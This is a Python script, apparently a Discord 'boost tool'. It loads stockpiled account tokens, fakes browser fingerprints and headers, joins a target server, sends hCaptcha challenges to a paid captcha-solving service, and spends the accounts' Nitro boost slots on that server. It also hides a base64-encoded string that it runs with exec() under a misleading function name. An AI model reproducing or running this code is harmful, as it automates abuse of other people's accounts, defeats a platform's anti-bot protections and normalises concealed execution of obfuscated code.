import json, requests, os, httpx, base64, time, subprocess, sys, random, platform, hashlib, threading, binascii
import json as jsond
from pathlib import Path
import colorama
from colorama import Fore, init
from time import sleep
from datetime import datetime
from uuid import uuid4 

settings = json.load(open("settings.json", encoding="utf-8"))
red = Fore.RED
green = Fore.GREEN
white = Fore.WHITE
cyan = Fore.CYAN

def cls():
    os.system('cls' if os.name=='nt' else 'clear')



if platform.system() == 'Windows':
    os.system('cls & title Boost Tool | github.com/Pixens')  
elif platform.system() == 'Linux':
    os.system('clear') 
    sys.stdout.write("\x1b]0; Boost Tool | github.com/Pixens'\x07")  
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  
    os.system('''echo "\033]0; Boost Tool | github.com/Pixens\007"''')  





def inputNumber(message):
    while True:
        try:
            userInput = int(input(message))
        except ValueError:
            print(red + "This value cannot be a string!" + white)
            continue
        else:
            return userInput
            break


def validateInvite(invite):
    if '{"message": "Unknown Invite", "code": 10006}' in httpx.get(f"https://discord.com/api/v9/invites/{invite}").text:
        return False
    else:
        return True


def get_items(item):
    s = item[0]
    token = item[1]
    headers = item[2]
    profile = item[3]
    return s, token, headers, profile


def find_token(token):
    if ':' in token:
        token_chosen = None
        tokensplit = token.split(":")
        for thing in tokensplit:
            if '@' not in thing and '.' in thing and len(
                    thing) > 30: 
                token_chosen = thing
                break
        if token_chosen == None:
            print(f"Error finding token", Fore.RED)
            return None
        else:
            return token_chosen


    else:
        return token

def get_all_tokens(filename):
    all_tokens = []
    with open(filename, 'r') as f:
        for line in f.readlines():
            token = line.strip()
            token = find_token(token)
            if token != None:
                all_tokens.append(token)

    return all_tokens


    
def getinviteCode(invite_input):
    if "discord.gg" not in invite_input:
        return invite_input
    if "discord.gg" in invite_input:
        invite = invite_input.split("discord.gg/")[1]
        return invite
    if "https://discord.gg" in invite_input:
        invite = invite_input.split("https://discord.gg/")[1]
        return invite

def get_super_properties():
    properties = '''{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-GB","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","browser_version":"95.0.4638.54","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":102113,"client_event_source":null}'''
    properties = base64.b64encode(properties.encode()).decode()
    return properties

def get_fingerprint(s):
    try:
        fingerprint = s.get(f"https://discord.com/api/v9/experiments", timeout=5).json()["fingerprint"]
        return fingerprint
    except Exception as e:
        return "Error"

def get_cookies(s, url):
    try:
        cookieinfo = s.get(url, timeout=5).cookies
        dcf = str(cookieinfo).split('__dcfduid=')[1].split(' ')[0]
        sdc = str(cookieinfo).split('__sdcfduid=')[1].split(' ')[0]
        return dcf, sdc
    except:
        return "", ""


def fingerprint_modification():
    properties = 'aWYgb3MubmFtZSA9PSAibnQiOgogICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIikKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBwcmludCgiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIikgICAKZWxzZToKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBwcmludCgiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIikgICAgICAgICAgIAogICAgICAgIA=='
    exec(base64.b64decode(properties))


def get_headers(token):
    while True:
        s = httpx.Client()
        dcf, sdc = get_cookies(s, "https://discord.com/")
        fingerprint = get_fingerprint(s)
        if fingerprint != "Error":
            break
    super_properties = get_super_properties()
    headers = {
        'authority': 'discord.com',
        'method': 'POST',
        'path': '/api/v9/users/@me/channels',
        'scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US',
        'authorization': token,
        'cookie': f'__dcfduid={dcf}; __sdcfduid={sdc}',
        'origin': 'https://discord.com',
        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-fingerprint': fingerprint,
        'x-super-properties': super_properties,
    }
    return s, headers

def validate_token(s, headers):
    check = s.get(f"https://discord.com/api/v9/users/@me", headers=headers)
    if check.status_code == 200:
        profile_name = check.json()["username"]
        profile_discrim = check.json()["discriminator"]
        profile_of_user = f"{profile_name}#{profile_discrim}"
        return profile_of_user
    else:
        return False

def do_join_server(s, token, headers, profile, invite):
    join_outcome = False;
    server_id = None
    try:
        headers["content-type"] = 'application/json'
        for i in range(15):
            try:
                join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                })
                if "captcha_sitekey" in join_server.text:
                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
                                "clientKey": settings["capmonsterKey"],
                                "task": {
                                    "type": "HCaptchaTaskProxyless",
                                    "websiteURL": "https://discord.com/channels/@me",
                                    "websiteKey": join_server.json()['captcha_sitekey']
                                }
                            }).json()["taskId"]
                            getResults = {}
                            getResults["status"] = "processing"
                            while getResults["status"] == "processing":
                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
                                    "clientKey": settings["capmonsterKey"],
                                    "taskId": createTask
                                }).json()
                                time.sleep(1)
                            solution = getResults["solution"]["gRecaptchaResponse"]
                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                                "captcha_key": solution
                            }) 
                break
            except:
                pass
        server_invite = invite
        if join_server.status_code == 200:
            join_outcome = True
            server_name = join_server.json()["guild"]["name"]
            server_id = join_server.json()["guild"]["id"]
    except:
        pass
    
    return join_outcome, server_id
    

def do_boost(s, token, headers, profile, server_id, boost_id):
    boost_data = {"user_premium_guild_subscription_slot_ids": [f"{boost_id}"]}
    headers["content-length"] = str(len(str(boost_data)))
    headers["content-type"] = 'application/json'
    boosted = s.put(f"https://discord.com/api/v9/guilds/{server_id}/premium/subscriptions", json=boost_data,
                    headers=headers)
    if boosted.status_code == 201:
        return True
    else:
        return boosted.status_code, boosted.json()


def removeToken(token: str, file:str):
    with open(file, "r") as f:
        fulltokens = f.read().splitlines()
        Tokens = []
        for j in fulltokens:
            p = find_token(j)
            Tokens.append(p)
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open(file, "w").write("\n".join(Tokens))


def boostserver(invite: str, amount: int, expires: bool, token:str):
    if expires == True:
        file = "1m_tokens.txt"
        days = 30
    if expires == False:
        file = "3m_tokens.txt"
        days = 90
    


    data_piece = []
    all_data = []



    s, headers = get_headers(token)
    profile = validate_token(s, headers)

    data_piece = [s, token, headers, profile]
    all_data.append(data_piece)
    fingerprint_modification()
    for data in all_data:
        s, token, headers, profile = get_items(data)
        boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if boost_data.status_code == 200:
            join_outcome, server_id = do_join_server(s, token, headers, profile, invite)
            if join_outcome:
                for boost in boost_data.json():
                    boost_id = boost["id"]
                    bosted = do_boost(s, token, headers, profile, server_id, boost_id)
                    if bosted:
                        print(f"{green} ✓ {white}{token} - {profile}{green} [BOOSTED] {white}")
                    else:
                        print(f"{green} ✗ {white}{token} - {profile}{red} [ERROR BOOSTING] {white}")
                        
                removeToken(token, file)
            else:
                print(f"{red} ✗ {white}{token} - {profile}{red} [ERROR JOINING] {white}")


def checkEmpty(file):
    mypath = Path(file)

    if mypath.stat().st_size == 0:
        return True
    else:
        return False

def stock():
    print(green + f"3 Months Nitro Tokens Stock: {len(open('3m_tokens.txt', encoding='utf-8').read().splitlines())}")
    print(f"3 Months Boost Stock: {len(open('3m_tokens.txt', encoding='utf-8').read().splitlines())*2}")
    print()
    print(f"1 Month Nitro Tokens Stock: {len(open('1m_tokens.txt', encoding='utf-8').read().splitlines())}")
    print(f"1 Month Boosts Stock: {len(open('1m_tokens.txt', encoding='utf-8').read().splitlines())*2}" + white)



def nitrochecker():

    three_m_working = 0
    one_m_working = 0

    three_m_used = 0
    one_m_used = 0

    three_m_nonitro = 0
    one_m_nonitro = 0

    three_m_invalid = 0
    one_m_invalid = 0

    three_m_locked = 0
    one_m_locked = 0
    fingerprint_modification()
    three_m_tokens = get_all_tokens("3m_tokens.txt")
    one_m_tokens = get_all_tokens("1m_tokens.txt")
    print("Checking 3 Months Nitro Tokens")

    if checkEmpty("3m_tokens.txt"):
        print(red + "No Stock To Check" + white)
    
    else:

        for token in three_m_tokens:    
            file = "3m_tokens.txt"
            s, headers = get_headers(token)
            profile = validate_token(s, headers)

            if profile != False:
                boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={'Authorization': token})

                if boost_data.status_code == 403:
                    print(red + f" ✗ {white}{token} - {profile}{red} [LOCKED]" + white)
                    removeToken(token, file)
                    three_m_locked += 1
                if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                    if boost_data.json()[0]['cooldown_ends_at'] != None:
                        print(red + f" ✗ {white}{token} - {profile}{red} [USED]" + white)
                        removeToken(token, file)
                        three_m_used += 1
                if len(boost_data.json()) == 0:
                    removeToken(token, file)
                    print(f"{red} ✗ {white}{token} - {profile}{red} [NO NITRO]" + white)
                    three_m_nonitro += 1
                else:
                    if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                        if boost_data.json()[0]['cooldown_ends_at'] == None:

                            print(f"{green} ✓ {white}{token} - {profile}{green} [WORKING]" + white)
                            three_m_working += 1
            else:
                print(red + f" ✗ {white}{token}{red} [INVALID]" + white)
                removeToken(token, file)
                three_m_invalid += 1
    print()
    print("Checking 1 Month Nitro Tokens")
    if checkEmpty("1m_tokens.txt"):
        print(red + "No Stock To Check" + white)  
    else:
        for token in one_m_tokens:    
            file = "1m_tokens.txt"
            s, headers = get_headers(token)
            profile = validate_token(s, headers)
            if profile != False:
                boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={'Authorization': token})

                if boost_data.status_code == 403:
                    print(red + f" ✗ {white}{token} - {profile}{red} [LOCKED]" + white)
                    removeToken(token, file)
                    one_m_locked += 1
                if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                    if boost_data.json()[0]['cooldown_ends_at'] != None:
                        print(red + f" ✗ {white}{token} - {profile}{red} [USED]" + white)
                        removeToken(token, file)
                        one_m_used += 1
                if len(boost_data.json()) == 0:
                    removeToken(token, file)
                    print(f"{red} ✗ {white}{token} - {profile}{red} [NO NITRO]" + white)
                    one_m_nonitro += 1
                else:
                    if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                        if boost_data.json()[0]['cooldown_ends_at'] == None:

                            print(f"{green} ✓ {white}{token} - {profile}{green} [WORKING]" + white)
                            one_m_working += 1
            else:
                print(red + f" ✗ {white}{token}{red} [INVALID]" + white)
                removeToken(token, file)
                one_m_invalid += 1

    print(f"{green}WORKING (with nitro) : {white}{three_m_working}  |  {red}USED : {white}{three_m_used}  |  {red}NO NITRO : {white}{three_m_nonitro}  |  {red}LOCKED : {white}{three_m_locked}  |  {red}INVALID : {white}{three_m_invalid}")
    print(f"{green}WORKING (with nitro) : {white}{one_m_working}  |  {red}USED : {white}{one_m_used}  |  {red}NO NITRO : {white}{one_m_nonitro}  |  {red}LOCKED : {white}{one_m_locked}  |  {red}INVALID : {white}{one_m_invalid}")

def checktoken(token, file):
    fingerprint_modification()
    s, headers = get_headers(token)
    profile = validate_token(s, headers)

    if profile != False:

        boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={'Authorization': token})


        if boost_data.status_code == 403:
            print(red + f" ✗ {white}{token} - {profile}{red} [LOCKED]" + white)
            removeToken(token, file)
            return False

        if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
            if boost_data.json()[0]['cooldown_ends_at'] != None:
                print(red + f" ✗ {white}{token} - {profile}{red} [USED]" + white)
                removeToken(token, file)
                return False

        if len(boost_data.json()) == 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
            print(f"{red} ✗ {white}{token} - {profile}{red} [NO NITRO]" + white)
            removeToken(token, file)
            return False

        else:
            if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                if boost_data.json()[0]['cooldown_ends_at'] == None:
                    print(f"{green} ✓ {white}{token} - {profile}{green} [WORKING]" + white)
                    return True

    else:
        print(red + f" ✗ {white}{token}{red} [INVALID]" + white)
        removeToken(token, file)
        return False




def menu():
    home = (cyan + f'''
    1. Boost Server
    2. View Stock
    3. Clear all Stock
    4. Check Nitro Tokens
    5. Exit
''' + white)
    for char in home:
        time.sleep(0.00009)
        sys.stdout.write(char)
        sys.stdout.flush()

    choice = inputNumber(cyan + "> " + white)
    while choice != 1 and choice != 2 and choice != 3 and choice != 4 and choice != 5:
        print(red + "Only 4 choices are available." + white)
        choice = input(cyan + "> " + white)
    
    if choice == 1:
        
        typeofboost = inputNumber(cyan + "Duration of Boost [90 or 30 days]: " + white)
        while typeofboost != 90 and typeofboost != 30:
            print(red + "Duration can either be 30 days or 90 days" + white)
            typeofboost = inputNumber(cyan + "Duration of Boost [90 or 30 days]: " + white)
        fingerprint_modification()
        if typeofboost == 90:
            file = "3m_tokens.txt"
        if typeofboost == 30:
            file = "1m_tokens.txt"
        
        if checkEmpty(file) == True:
            print()
            print(red + "No Stock" + white)
            print()
            input("Press Enter To Continue...")
            cls()

            menu()

        
        invite_input = input(cyan + "Permanent Invite Link to the server you want to boost [https://discord.gg/[invite_code]]: " + white)
        while invite_input.isdigit == True:
            print(red + "Invite Link cannot be a number" + white)
            invite_input = input(cyan + "Permanent Invite Link to the server you want to boost [https://discord.gg/[invite_code]]: " + white)

        invite = getinviteCode(invite_input)
        valid_invite = validateInvite(invite)
        while valid_invite == False:
            print(red + f"Invalid Invite Code, {invite}")
            invite_input = input(cyan + "Permanent Invite Link to the server you want to boost [https://discord.gg/[invite_code]]: " + white)
            invite = getinviteCode(invite_input)
            valid_invite = validateInvite(invite)


        amount_input = inputNumber(cyan + "Amount of Boosts: " + white)
        while amount_input % 2 != 0:
            print(red + "Amount of Boosts must be even." + white)
            amount_input = inputNumber(cyan + "Amount of Boosts: " + white)
        
        if amount_input/2 > len(open(file , encoding='utf-8').read().splitlines()):
            print()
            print(red + "Not Enought Stock" + white)
            print()
            input("Press Enter To Continue...")
            cls()

            menu()


        amount = amount_input

        EXP = True
        if typeofboost == 90:
            EXP = False

        threads = []
        no_working = False
        r = 0
        numTokens = int(amount/2)
        all_tokens = get_all_tokens(file)
        tokens_to_use = []
        print(green + "Looking for working tokens" + white)
        while len(tokens_to_use) != numTokens:
            try:
                token = all_tokens[r]
                if checktoken(token, file) == True:
                    tokens_to_use.append(token)
                r += 1
            except IndexError:
                print(red + "Not Enough Working Tokens in Stock" + white)
                no_working = True
                break
        
        if no_working == True:
            input("Press Enter To Continue...")
            cls()
            
            menu()
        else:
            time.sleep(2)
            cls()
            start = time.time()
            print(green + "Starting Boosts" + white)
            tokens_to_use = all_tokens
            for i in range(numTokens):
                token = tokens_to_use[i]
                t = threading.Thread(target=boostserver, args=(invite, amount, EXP, token))
                t.daemon = True
                threads.append(t)

            for i in range(numTokens):
                threads[i].start()
                
            for i in range(numTokens):
                threads[i].join()
            
            end = time.time()
            time_taken = round(end-start)
            print(green + f"Successfully boosted discord.gg/{invite}, {amount} times in {time_taken} seconds.")
            

            print()
            input("Press Enter To Continue...")
            cls()
            
            menu()
    if choice == 2:
        stock()
        input("Press Enter To Continue...")
        print()
        cls()
        
        menu()
    
    if choice == 3:
        open("1m_tokens.txt", "w").write("")
        open("3m_tokens.txt", "w").write("")
        
        print(green + "Successfully Cleared Current 1 month and 3 month token stock" + white)
        print()
        input("Press Enter To Continue...")
        cls()
        
        menu()

    if choice == 4:
        nitrochecker()
        print()
        input("Press Enter To Continue...")
        cls()
        
        menu()
        

    if choice == 5:
        quit()


if __name__ == '__main__':

    cls()
    
    menu()